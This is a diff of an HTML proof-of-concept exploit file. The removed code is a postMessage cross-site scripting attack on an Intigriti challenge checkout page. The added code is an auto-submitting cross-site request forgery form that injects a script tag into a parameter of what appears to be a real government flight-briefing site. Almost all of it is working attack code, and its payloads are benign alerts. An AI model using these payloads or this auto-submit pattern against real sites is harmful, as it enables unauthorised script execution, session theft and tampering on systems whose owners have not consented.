@@ -1,47 +1,19 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>XSS via postMessage Exploit PoC by t0m1irv4n</title>
+    <title>MY POC</title>
 </head>
 <body>
-    <h1>Processing...</h1>
-
-    <iframe id="victim-iframe" src="https://challenge-0126.intigriti.io/checkout.html?currency=BTC&price=45000" style="width: 800px; height: 600px; border: 1px solid black;"></iframe>
-
-    <script>
-        document.getElementById('victim-iframe').onload = function() {
-            console.log("Iframe loaded. Sending malicious postMessage...");
-
-            // Payload XSS yang akan kita suntikkan ke parameter currency
-            const xss_payload = "<img src=x onerror=\"document.getElementById('flagBanner').classList.remove('hidden')\">";
-
-            // Gunakan alamat dengan format yang valid untuk lolos dari validasi awal
-            // Ini adalah alamat donasi Bitcoin yang valid secara format.
-            // const valid_format_address = "177c1e81f771578941e15b20ce19178f9a";
-            const valid_format_address = "177c1e81f771578941e15b20ce19178f9a";
-
-            const final_address_payload = valid_format_address + xss_payload;
-            console.log("Final payload for toAddress:", final_address_payload);
-
-            const maliciousMessage = {
-                type: 'submitTransaction',
-                transaction: {
-                    // Gunakan alamat yang formatnya valid
-                    // toAddress: transactionData.toAddress,
-                    toAddress: final_address_payload,
-                    // Tetap suntikkan payload di sini
-                    currency: "BTC",
-                    amount: 1
-                }
-            };
-
-            const victimIframe = document.getElementById('victim-iframe').contentWindow;
-            setTimeout(() => {
-                victimIframe.postMessage(maliciousMessage, '*');
-                console.log("Malicious message sent to iframe.");
-            }, 2500);
-        };
-    </script>
-</body>
+      <h3>XSS via CSRF PoC by t0m1irv4n</h3>
+      <form action="https://olbs.amssdelhi.gov.in/nsweb/FlightBriefing/showopmetquery.php" method="post">
+      <input type="hidden" name="icaos" value="HOLA&quot;>><</p><script>alert(`XSS`)</script>" />
+    <input type="hidden" name="type" value="taf" />
+          <input type="submit" value="Submit request" />
+      </form>
+      <script>
+          history.pushState('', '', '/');
+          document.forms[0].submit();
+      </script>
+  </body>
 </html>
 
